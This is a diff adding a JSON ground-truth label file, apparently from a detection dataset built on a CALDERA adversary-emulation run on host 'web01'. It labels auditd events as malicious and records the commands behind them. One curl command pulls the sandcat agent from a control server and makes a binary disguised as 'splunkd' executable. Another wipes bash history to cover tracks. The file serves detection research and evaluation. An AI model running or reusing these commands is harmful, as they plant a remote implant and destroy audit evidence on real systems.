@@ -1,0 +1,65 @@
+{
+ "category": "attack",
+ "malicious_event_ids": [
+  "smoke_web01_1200:auditd:0",
+  "smoke_web01_1200:auditd:1",
+  "smoke_web01_1200:auditd:2",
+  "smoke_web01_1200:auditd:3",
+  "smoke_web01_1200:auditd:4",
+  "smoke_web01_1200:auditd:5",
+  "smoke_web01_1200:auditd:6",
+  "smoke_web01_1200:auditd:7",
+  "smoke_web01_1200:auditd:8",
+  "smoke_web01_1200:auditd:9",
+  "smoke_web01_1200:auditd:10"
+ ],
+ "abilities": [
+  {
+   "name": "Agent deployment",
+   "status": "success",
+   "technique_id": "T1105",
+   "command": "curl -s -X POST -H file:sandcat.go -H platform:linux http://192.168.64.8:8888/file/download ; chmod +x splunkd ; curl -s -X POST -H file:sandcat.go -H platform:linux http://192.168.64.8:8888/file/download ; chmod +x splunkd ; curl -s -X POST -H file:sandcat.go -H platform:linux http://192.168.64.8:8",
+   "event_ids": [
+    "smoke_web01_1200:auditd:0",
+    "smoke_web01_1200:auditd:1",
+    "smoke_web01_1200:auditd:2",
+    "smoke_web01_1200:auditd:3",
+    "smoke_web01_1200:auditd:4",
+    "smoke_web01_1200:auditd:5",
+    "smoke_web01_1200:auditd:6",
+    "smoke_web01_1200:auditd:7",
+    "smoke_web01_1200:auditd:8",
+    "smoke_web01_1200:auditd:9"
+   ],
+   "bootstrap": false,
+   "deployment": true,
+   "process_event_ids": [
+    "smoke_web01_1200:auditd:0",
+    "smoke_web01_1200:auditd:1",
+    "smoke_web01_1200:auditd:2",
+    "smoke_web01_1200:auditd:3",
+    "smoke_web01_1200:auditd:4",
+    "smoke_web01_1200:auditd:5",
+    "smoke_web01_1200:auditd:6",
+    "smoke_web01_1200:auditd:7",
+    "smoke_web01_1200:auditd:8",
+    "smoke_web01_1200:auditd:9"
+   ]
+  },
+  {
+   "name": "Bootstrap T1070.003",
+   "status": "success",
+   "technique_id": "T1070.003",
+   "command": "> $HOME/.bash_history && unset HISTFILE",
+   "event_ids": [
+    "smoke_web01_1200:auditd:10"
+   ],
+   "bootstrap": true,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_web01_1200:auditd:10"
+   ]
+  }
+ ],
+ "source": "CALDERA report smoke-discovery_report.json + bootstrap actions from ground_truth.json: step pid + descendants, agent lineage"
+}
